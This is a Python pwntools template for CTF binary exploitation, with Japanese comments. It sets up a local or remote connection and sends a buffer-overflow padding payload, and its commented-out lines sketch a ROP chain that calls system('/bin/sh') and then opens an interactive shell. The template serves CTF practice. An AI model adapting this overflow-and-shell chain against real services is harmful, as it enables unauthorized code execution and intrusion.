#!/usr/bin/env python3
"""
CTF Pwn テンプレート
使い方: このファイルをコピーして問題ごとにカスタマイズ
"""
from pwn import *

# === 設定 ===
BINARY = './challenge'
HOST = 'example.com'
PORT = 1337
LOCAL = True  # ローカルデバッグ時はTrue

# === コンテキスト設定 ===
context.binary = elf = ELF(BINARY)
context.log_level = 'debug'  # 'info' or 'debug'
# context.terminal = ['tmux', 'splitw', '-h']

# libc (必要に応じて)
# libc = ELF('./libc.so.6')

# === 接続 ===
def conn():
    if LOCAL:
        # return process(BINARY)
        return gdb.debug(BINARY, '''
            # GDBスクリプト
            # b *main
            # b *vuln
            continue
        ''')
    else:
        return remote(HOST, PORT)

# === エクスプロイト ===
def exploit():
    io = conn()

    # === オフセット計算 ===
    # パターン生成: cyclic(100)
    # オフセット計算: cyclic_find(0x61616161)
    offset = 40  # 要調整

    # === ガジェット ===
    # ROPgadget --binary ./challenge | grep "pop rdi"
    # rop = ROP(elf)
    # pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    # ret = rop.find_gadget(['ret'])[0]

    # === ペイロード ===
    payload = b'A' * offset
    # payload += p64(ret)  # スタックアライメント (Ubuntu 18+)
    # payload += p64(pop_rdi)
    # payload += p64(next(elf.search(b'/bin/sh')))
    # payload += p64(elf.symbols['system'])

    # === 送信 ===
    io.sendlineafter(b'> ', payload)
    # io.sendline(payload)
    # io.send(payload)

    io.interactive()

if __name__ == '__main__':
    exploit()
